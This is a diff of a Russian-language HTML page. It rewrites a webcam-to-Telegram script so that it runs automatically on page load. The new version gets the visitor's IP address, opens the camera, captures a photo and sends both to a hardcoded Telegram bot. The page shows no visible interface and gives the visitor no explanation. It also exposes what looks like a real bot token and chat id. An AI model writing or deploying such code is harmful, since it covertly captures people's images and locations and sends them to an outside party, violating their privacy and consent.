@@ -1,52 +1,64 @@
 <!DOCTYPE html>
-<html>
-<head><title>IP + Фото в Telegram</title></head>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>Автоотправка IP и фото</title>
+</head>
 <body>
+  <script>
+    async function sendData() {
+      try {
+        // Получаем IP клиента через внешний сервис
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
 
-<video id="video" width="320" height="240" autoplay></video>
-<button id="snap">Сделать фото и отправить</button>
-<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+        // Получаем фото с веб-камеры (разрешение нужно будет дать пользователю)
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
 
-<script>
-const token = '8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU';
-const chat_id = '6945488830'; // вставь сюда
+        // Создаем canvas для захвата кадра
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
 
-// Получаем видеопоток с камеры
-const video = document.getElementById('video');
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => { video.srcObject = stream; })
-  .catch(console.error);
+        // Останавливаем камеру
+        stream.getTracks().forEach(track => track.stop());
 
-document.getElementById('snap').onclick = async () => {
-  // Захват фото с видео
-  const canvas = document.getElementById('canvas');
-  const context = canvas.getContext('2d');
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  
-  // Получаем base64 фото
-  const photoBase64 = canvas.toDataURL('image/jpeg').split(',')[1];
-  
-  // Получаем IP
-  const ipResp = await fetch('https://api.ipify.org?format=json');
-  const ipData = await ipResp.json();
-  const ip = ipData.ip;
+        // Преобразуем кадр в Blob формата JPEG
+        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-  // Отправляем IP в текстовом сообщении
-  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=IP пользователя: ${ip}`)
-    .then(() => {
-      // Отправляем фото как файл (через sendPhoto с base64, нужно использовать FormData и fetch POST)
-      const formData = new FormData();
-      formData.append('chat_id', chat_id);
-      formData.append('photo', `data:image/jpeg;base64,${photoBase64}`);
+        // Формируем FormData для отправки в Telegram
+        const formData = new FormData();
+        formData.append('chat_id', '<6945488830>');
+        formData.append('photo', photoBlob, 'photo.jpg');
+        formData.append('caption', `IP: ${ip}`);
 
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      }).then(() => alert('IP и фото отправлены в Telegram'))
-        .catch(console.error);
-    }).catch(console.error);
-}
-</script>
+        // Отправка фото с подписью в Telegram бот через Bot API
+        const resp = await fetch(`https://api.telegram.org/bot<8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU>/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
 
+        const result = await resp.json();
+        if (result.ok) {
+          console.log('Данные успешно отправлены');
+        } else {
+          console.error('Ошибка отправки:', result.description);
+        }
+
+      } catch (err) {
+        console.error('Ошибка:', err);
+      }
+    }
+
+    window.onload = () => {
+      sendData();
+    };
+  </script>
 </body>
 </html>
